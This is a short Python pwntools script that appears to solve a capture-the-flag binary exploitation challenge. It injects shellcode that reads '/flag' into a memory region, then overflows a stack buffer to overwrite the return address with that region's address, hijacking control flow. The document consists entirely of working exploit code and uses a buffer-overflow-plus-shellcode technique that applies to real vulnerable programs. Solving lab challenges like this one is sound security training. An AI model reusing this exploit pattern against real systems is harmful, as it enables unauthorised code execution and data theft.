from pwn import *
from pwn import asm, context, process
from pwnlib.shellcraft import shellcraft

context.update(arch="amd64", os="linux")
context.log_level = "error"

binary_path = "/challenge/binary-exploitation-hijack-to-mmap-shellcode"
p = process(binary_path)

padding = b"\x90" * 2048

shellcode = asm(shellcraft.cat("/flag"))
payload = shellcode.ljust(4096, b"\x90")
p.send(payload)

time.sleep(0.5)
p.sendline()
time.sleep(0.5)

padding = b"A" * 48 + b"B" * 8
target_address = p64(0x178D0000)

payload = padding + target_address
p.send(payload)

p.interactive()
